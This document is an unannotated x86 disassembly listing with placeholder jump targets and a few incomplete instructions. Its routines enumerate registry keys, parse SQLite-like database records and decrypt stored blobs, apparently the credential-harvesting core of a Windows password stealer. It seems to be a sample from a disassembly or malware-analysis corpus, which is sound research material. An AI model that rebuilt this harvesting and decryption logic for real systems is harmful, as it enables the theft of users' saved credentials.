push [ ebp + 0x8 ]
call sub_4014e6
jmp r-xdata
sub_40ac9c
push ebp
mov ebp esp
add esp 0xfffff7e8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x810 ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x818 ] eax
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
push rw-data
push [ ebp - 0x818 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
cmp [ ebp - 0x814 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_40ac9c
push [ ebp - 0x818 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push [ ebp - 0x814 ]
call sub_401835
mov eax [ ebp - 0x814 ]
push [ eax ]
pop [ ebp - 0x814 ]
cmp [ ebp - 0x814 ] 0x3e8
jbe r-xdata
jmp r-xdata
mov [ ebp - 0x814 ] 0x3e8
cmp [ ebp - 0x814 ] 0x0
jne r-xdata
dec [ ebp - 0x814 ]
push [ ebp - 0x814 ]
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_40aa03
sub_40add7
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x30
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40ac9c
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40ae08
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x31
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40ae86
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
mov ebx 0x1
jmp r-xdata
sub eax eax
sub edx edx
pop ebx
leave
retn 0xc
cmp ebx 0x9
jbe r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4013bd
cmp ebx 0x9
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax eax
sub edx edx
jmp r-xdata
push eax
and eax 0xffffff7f
or [ ebp - 0x8 ] eax
pop eax
test eax 0x80
jne r-xdata
or [ ebp - 0x8 ] eax
jmp r-xdata
pop ebx
leave
retn 0xc
cmp ebx 0x8
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
shld edx eax 0x7
shl eax 0x7
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
shld edx eax 0x8
shl eax 0x8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
inc ebx
sub_40af32
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
cmp [ ebp + 0xc ] eax
jbe r-xdata
push [ rw-data ]
call sub_40184c
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
call sub_401000
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40133e
or eax eax
je r-xdata
sub eax eax
leave
retn 0x10
push [ ebp - 0x4 ]
call sub_401021
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_40118c
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x8 ]
call sub_401835
mov eax [ ebp - 0x4 ]
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
sub edx edx
mov eax [ ebp - 0xc ]
mul [ rw-data ]
or edx edx
je r-xdata
jmp r-xdata
push 0x0
push eax
push [ ebp + 0x8 ]
call sub_401047
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401364
mov edx [ ebp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0xc ] eax
mov ecx [ rw-data ]
sub ecx 0x4
push ecx
push [ ebp + 0x14 ]
push ecx
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40133e
pop ecx
or eax eax
jne r-xdata
jmp r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_40118c
push [ ebp - 0x4 ]
call sub_401082
cmp eax 0x6400000
jbe r-xdata
jmp r-xdata
jmp r-xdata
sub_40b045
push ebp
mov ebp esp
push edi
mov eax [ ebp + 0xc ]
add eax 0x8
push eax
call sub_40184c
mov edi eax
push [ ebp + 0xc ]
pop [ edi ]
push [ ebp + 0x10 ]
pop [ edi + 0x4 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] edi
mov eax 0x1
pop edi
leave
retn 0x10
push [ ebp + 0xc ]
lea eax [ edi + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401883
sub_40b086
push ebp
mov ebp esp
add esp 0xfffffff4
mov edx [ ebp + 0x14 ]
mov [ edx ] 0x0
sub edx edx
test [ ebp + 0xc ] 0x1
sete dl
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x14 ]
push 0x3
push 0x0
push 0x0
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4013bd
mov [ ebp - 0x4 ] eax
push [ ebp + 0x14 ]
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
call sub_40b045
jmp r-xdata
leave
retn 0x10
cmp [ ebp + 0xc ] 0x3
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_401390
mov [ ebp - 0x4 ] eax
push [ ebp + 0x14 ]
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0x4
jne r-xdata
push [ ebp + 0x10 ]
push 0x3
push [ ebp + 0x8 ]
call sub_4013e8
push [ ebp + 0x14 ]
push 0x3
push 0x0
push 0x0
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0x5
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x4 ] eax
push [ ebp + 0x14 ]
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0x6
jne r-xdata
push [ ebp + 0x10 ]
push 0x6
push [ ebp + 0x8 ]
call sub_4013e8
mov eax 0x1
jmp r-xdata
cmp [ ebp + 0xc ] 0x7
jne r-xdata
push [ ebp + 0x10 ]
push 0x8
push [ ebp + 0x8 ]
call sub_4013e8
push [ ebp + 0x14 ]
push 0x3
push 0x0
push 0x0
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jne r-xdata
push [ ebp + 0x10 ]
push 0x8
push [ ebp + 0x8 ]
call sub_4013e8
push [ ebp + 0x14 ]
push 0x3
push 0x0
push 0x0
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0x9
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x14 ]
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x14 ]
push 0x0
push 0x4
lea eax [ ebp - 0x4 ]
push eax
call sub_40b045
jmp r-xdata
cmp [ ebp + 0xc ] 0xb
jne r-xdata
mov eax 0x0
jmp r-xdata
cmp [ ebp + 0xc ] 0xc
jb r-xdata
mov eax 0x0
jmp r-xdata
cmp [ ebp + 0xc ] 0xd
jb r-xdata
or edx edx
je r-xdata
mov eax 0x0
or edx edx
jne r-xdata
cmp [ ebp + 0xc ] 0x6400000
jae r-xdata
cmp [ ebp + 0xc ] 0x6400000
jae r-xdata
push [ ebp + 0xc ]
pop [ ebp - 0xc ]
sub [ ebp - 0xc ] 0xc
shr [ ebp - 0xc ] 0x1
push [ ebp - 0xc ]
call sub_40184c
mov [ ebp - 0x8 ] eax
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40133e
push [ ebp + 0x14 ]
push 0x2
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_40b045
push [ ebp - 0x8 ]
call sub_401835
mov eax 0x1
jmp r-xdata
push [ ebp + 0xc ]
pop [ ebp - 0xc ]
sub [ ebp - 0xc ] 0xd
shr [ ebp - 0xc ] 0x1
push [ ebp - 0xc ]
call sub_40184c
mov [ ebp - 0x8 ] eax
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40133e
push [ ebp + 0x14 ]
push 0x1
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_40b045
push [ ebp - 0x8 ]
call sub_401835
mov eax 0x1
jmp r-xdata
sub_40b2e7
push ebp
mov ebp esp
push esi
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
pop esi
leave
retn 0x4
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call sub_401835
add esi 0x4
push [ ebp + 0x8 ]
call sub_401835
pop esi
leave
retn 0x4
sub_40b317
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ eax + edx * 4 ]
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push [ eax ]
pop [ edx ]
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov edx [ ebp + 0x14 ]
push [ eax + 0x4 ]
pop [ edx ]
leave
retn 0x14
mov edx [ ebp + 0x18 ]
push eax
pop [ edx ]
add [ edx ] 0x8
sub_40b351
push ebp
mov ebp esp
add esp 0xffffffdc
push edi
push esi
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_401082
or eax eax
jne r-xdata
sub eax eax
pop esi
pop edi
leave
retn 0xc
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call sub_4012bb
mov [ ebp - 0xc ] 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40ae86
cmp [ ebp - 0x14 ] eax
ja r-xdata
sub eax eax
pop esi
pop edi
leave
retn 0xc
sub eax eax
pop esi
pop edi
leave
retn 0xc
cmp [ ebp - 0xc ] 0x0
je r-xdata
or edx edx
je r-xdata
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xa00000
jbe r-xdata
mov eax [ ebp - 0x18 ]
shl eax 0x2
push eax
call sub_40184c
mov [ ebp - 0x4 ] eax
mov edi eax
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
sub eax eax
pop esi
pop edi
leave
retn 0xc
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
call sub_401835
sub eax eax
pop esi
pop edi
leave
retn 0xc
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40ae86
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x18 ]
ja r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
call sub_401835
sub eax eax
pop esi
pop edi
leave
retn 0xc
or edx edx
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x1c ]
pop [ eax ]
mov eax [ ebp - 0x1c ]
shl eax 0x2
push eax
call sub_40184c
mov [ ebp - 0x24 ] eax
mov edi [ ebp - 0x24 ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
jmp r-xdata
sub [ ebp - 0x18 ] ecx
inc [ ebp - 0x1c ]
stosd [ edi ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call sub_401835
mov eax 0x1
pop esi
pop edi
leave
retn 0xc
mov eax [ ebp + 0xc ]
push [ ebp - 0x24 ]
pop [ eax ]
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lodsd [ esi ]
mov edx eax
mov [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push edx
push [ ebp + 0x8 ]
call sub_40b086
or eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
push [ ebp - 0x24 ]
call sub_40b2e7
push [ ebp - 0x4 ]
call sub_401835
sub eax eax
pop esi
pop edi
leave
retn 0xc
push [ ebp - 0x20 ]
call sub_401835
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
stosd [ edi ]
dec [ ebp - 0x1c ]
sub_40b4fb
push ebp
mov ebp esp
add esp 0xffffffc8
push edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
dec [ ebp + 0x10 ]
sub edx edx
mov eax [ ebp + 0x10 ]
mul [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x0
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_401047
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x1
pop edi
leave
retn 0x14
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_4013bd
mov [ ebp - 0x4 ] eax
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401390
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401390
mov [ ebp - 0x8 ] eax
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401390
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_4013bd
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
je r-xdata
push 0x1
push 0x64
push [ ebp + 0x8 ]
call sub_401047
sub eax eax
pop edi
leave
retn 0x14
cmp [ ebp - 0x4 ] 0xd
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
cmp [ ebp - 0x8 ] eax
jbe r-xdata
cmp [ ebp - 0x4 ] 0x5
je r-xdata
cmp [ ebp - 0x4 ] 0x5
jne r-xdata
sub eax eax
pop edi
leave
retn 0x14
push 0x10000
call sub_40184c
mov [ ebp - 0xc ] eax
sub edi edi
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x38 ] eax
cmp edi [ ebp - 0x8 ]
jb r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401390
mov edx [ ebp - 0xc ]
mov [ edx + edi * 4 ] eax
inc edi
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x5
jne r-xdata
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
cmp [ ebp - 0x4 ] 0xd
jne r-xdata
sub edi edi
jmp r-xdata
push [ ebp - 0xc ]
call sub_401835
mov eax 0x1
pop edi
leave
retn 0x14
sub edi edi
jmp r-xdata
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp edi [ ebp - 0x8 ]
jb r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + edi * 4 ]
add eax [ ebp - 0x10 ]
push 0x0
push eax
push [ ebp + 0x8 ]
call sub_401047
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_401364
mov [ ebp - 0x34 ] eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_40ae86
mov ecx [ ebp + 0x14 ]
cmp [ ecx ] 0x0
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x38 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b4fb
or eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + edi * 4 ]
add eax [ ebp - 0x10 ]
push 0x0
push eax
push [ ebp + 0x8 ]
call sub_401047
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_40ae86
mov ecx [ ebp + 0x14 ]
cmp [ ecx ] 0x0
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x34 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b4fb
or eax eax
jne r-xdata
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
or edx edx
je r-xdata
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
inc edi
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
mov [ ebp - 0x14 ] eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_40ae86
mov ecx [ ebp + 0x14 ]
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
push [ rw-data ]
pop [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
sub eax 0xc
shl eax 0x5
sub edx edx
mov ecx 0xff
div ecx
sub eax 0x17
mov [ ebp - 0x20 ] eax
sub [ ebp - 0x18 ] 0x23
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
ja r-xdata
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
sub edx edx
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
add ecx 0x23
sub ecx 0x4
div ecx
add edx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_40af32
or eax eax
jne r-xdata
mov [ ebp - 0x24 ] eax
mov edx eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push edx
call sub_40b351
mov [ ebp - 0x30 ] eax
push [ ebp - 0x24 ]
call sub_401021
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push [ ebp - 0xc ]
call sub_401835
sub eax eax
pop edi
leave
retn 0x14
inc edi
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebp + 0x18 ]
push [ ebp - 0x28 ]
call sub_40b2e7
sub_40b801
push ebp
mov ebp esp
push edi
push [ ebp + 0x8 ]
call sub_40287b
push rw-data
push [ ebp + 0x8 ]
call StrStrIA
or eax eax
jne r-xdata
mov [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_40287b
mov edi rw-data
pop edi
leave
retn 0x8
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
pop edi
leave
retn 0x8
push [ ebp + 0x8 ]
push edi
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebp + 0x8 ]
call lstrlenA
or eax eax
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call lstrcmpiA
or eax eax
jne r-xdata
pop edi
leave
retn 0x8
push rw-data
push [ ebp + 0x8 ]
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebp + 0xc ]
pop [ rw-data ]
push rw-data
push [ ebp + 0x8 ]
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebp + 0xc ]
pop [ rw-data ]
mov eax 0x1
pop edi
leave
retn 0x8
push [ ebp + 0xc ]
pop [ rw-data ]
sub_40b8bc
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
push rw-data
push [ ebp + 0x8 ]
call StrStrIA
or eax eax
jne r-xdata
inc eax
mov esi eax
mov edi [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
cmp [ esi ] 0x0
jne r-xdata
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push rw-data
push [ ebp + 0x8 ]
call StrStrIA
or eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x9
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov [ edi ] 0x20
cmp [ edi ] 0xd
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0xa
je r-xdata
cmp [ edi ] 0x27
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
cmp [ edi ] 0x5b
je r-xdata
cmp [ edi ] 0x5c
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x5d
je r-xdata
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
jmp r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
cmp [ edi ] 0x20
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
cmp [ edi ] 0x60
jne r-xdata
inc edi
mov [ edi ] 0x20
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ edi ] 0x20
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
inc edi
cmp [ edi + 0x1 ] 0x20
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
inc edi
push edi
jmp r-xdata
cmp [ edi ] 0x2c
jne r-xdata
push [ ebp - 0xc ]
push esi
call sub_40b801
pop edi
pop esi
leave
retn 0x4
cmp [ edi ] 0x0
jne r-xdata
inc edi
mov [ edi ] 0x0
push [ ebp - 0xc ]
push esi
call sub_40b801
or eax eax
jne r-xdata
mov al [ edi + 0x1 ]
mov [ edi ] al
inc edi
pop edi
dec edi
mov esi edi
inc esi
inc [ ebp - 0xc ]
pop edi
pop esi
leave
retn 0x4
sub_40b9fb
push ebp
mov ebp esp
add esp 0xffffffc8
push esi
push edi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
pop edi
pop esi
leave
retn 0x10
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
cmp [ rw-data ] eax
jae r-xdata
pop edi
pop esi
leave
retn 0x10
cmp [ rw-data ] eax
jae r-xdata
cmp [ rw-data ] eax
jae r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ rw-data ]
push [ ebp + 0x10 ]
call sub_40b317
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ rw-data ]
push [ ebp + 0x10 ]
call sub_40b317
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ rw-data ]
push [ ebp + 0x10 ]
call sub_40b317
push [ ebp - 0x1c ]
pop [ ebp - 0x2c ]
push [ ebp - 0x24 ]
pop [ ebp - 0x28 ]
mov [ ebp - 0x30 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x1c ]
ja r-xdata
cld
mov esi [ ebp - 0x30 ]
mov edi [ ebp - 0x24 ]
mov ecx [ ebp - 0x34 ]
jecxz r-xdata
push [ ebp - 0x34 ]
pop [ ebp - 0x1c ]
push [ ebp - 0x30 ]
call LocalFree
cmp [ ebp - 0x4 ] 0x0
je r-xdata
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call sub_40184c
mov [ ebp - 0x38 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x38 ]
push [ ebp - 0xc ]
call sub_401883
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x38 ]
call StrCmpNIA
or eax eax
je r-xdata
or eax eax
je r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x38 ]
call StrCmpNIA
or eax eax
jne r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x38 ]
call StrCmpNIA
push [ ebp - 0x38 ]
call sub_401835
push 0xbeef0000
push [ ebp + 0xc ]
call sub_4014e6
push [ rw-data ]
push [ ebp + 0xc ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call sub_40151c
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push [ ebp + 0xc ]
call sub_40151c
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
call sub_40151c
sub_40bbd0
push ebp
mov ebp esp
add esp 0xffffffe8
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
leave
retn 0x10
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x2
push [ ebp + 0x10 ]
call sub_40b317
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
push [ ebp - 0xc ]
pop [ ebp - 0x10 ]
push rw-data
push [ ebp - 0x10 ]
call lstrcmpiA
or eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ ebp + 0x10 ]
call sub_40b317
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
push [ ebp - 0xc ]
push rw-data
call lstrcmpA
or eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x3
push [ ebp + 0x10 ]
call sub_40b317
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push [ eax ]
pop [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x4
push [ ebp + 0x10 ]
call sub_40b317
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
push [ ebp - 0xc ]
call sub_40b8bc
mov [ ebp - 0x18 ] 0x1
cmp [ rw-data ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
push sub_40b9fb
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b4fb
sub_40bcf7
push ebp
mov ebp esp
add esp 0xffffffec
push [ ebp + 0x8 ]
call sub_4012bb
push 0x10
lea eax [ ebp - 0x10 ]
push eax
